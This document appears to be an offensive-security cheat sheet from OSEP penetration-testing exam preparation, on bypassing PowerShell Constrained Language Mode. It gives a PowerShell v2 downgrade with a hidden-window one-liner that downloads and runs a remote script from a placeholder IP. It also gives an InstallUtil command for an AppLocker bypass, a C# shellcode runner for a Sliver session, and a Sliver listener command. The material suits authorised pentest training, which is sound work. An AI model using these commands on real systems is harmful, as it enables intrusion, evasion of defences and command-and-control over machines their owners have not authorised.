# Constrained Language Mode (CLM) Bypass

Some OSEP targets enforce PowerShell CLM (e.g. via AppLocker WDAC policies).
CLM blocks `Add-Type`, arbitrary .NET reflection, and most command execution.

## 0. Detect CLM

```powershell
$ExecutionContext.SessionState.LanguageMode
# FullLanguage      -> not constrained
# ConstrainedLanguage -> you are in CLM
```

## Technique 1 — PowerShell v2 downgrade (most common OSEP approach)

If PowerShell 2.0 is still available, v2 does not enforce CLM:

```powershell
powershell.exe -version 2
# or from within a session:
#   powershell -v 2 -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP>/run.ps1')"
```

Check availability:

```powershell
Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
```

## Technique 2 — InstallUtil (signed .NET loader)

CLM only constrains PowerShell, not .NET. Use a signed loader (like the one in
`../word-macro/installutil-applocker-bypass/installutil.cs`) that spawns a full
PowerShell runspace:

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\path\to\Loader.exe
```

The loader's `Uninstall` override runs `System.Management.Automation` in a new
runspace — outside the constrained one.

## Technique 3 — Use a full C# shellcode runner

CLM has no effect on compiled C#. Drop a `cs-loaders/` or `aes-loaders/` runner
and execute it directly to get a Sliver session, then use Sliver's own
post-exploitation instead of PowerShell.

---

## Listener

```bash
sliver > mtls --lhost <IP> --lport 443
```
